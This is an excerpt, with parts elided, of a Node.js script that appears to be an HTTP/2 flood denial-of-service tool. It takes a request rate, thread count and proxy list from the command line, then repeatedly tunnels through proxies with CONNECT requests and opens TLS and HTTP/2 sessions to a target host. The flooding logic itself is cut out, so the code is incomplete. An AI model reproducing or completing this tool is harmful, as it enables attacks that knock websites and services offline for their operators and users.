...
const rate = parseInt(process.argv[4]) || 1000;
const numThreads = parseInt(process.argv[5]) || os.cpus().length;
const proxiesFile = process.argv[6] || 'http.txt';
...
async function conn() {
    ...
    setInterval(async function () {
        ...
        const socket = net.connect(proxyPort, proxyHost, () => {
            const connectReq = [
                `CONNECT ${targetURL.host}:${targetURL.port || 443} HTTP/1.1`,
                `Host: ${targetURL.host}`,
                '',
                ''
            ].join('\r\n');
        ...
        socket.on('data', (data) => {
            if (/^HTTP\/1.1 200 Connection established\r\n/.test(data.toString())) {
                ...
                const tlsSocket = tls.connect(tlsOptions, () => {
                    ...
                    const session = http2.connect(`https://${targetURL.host}`, {
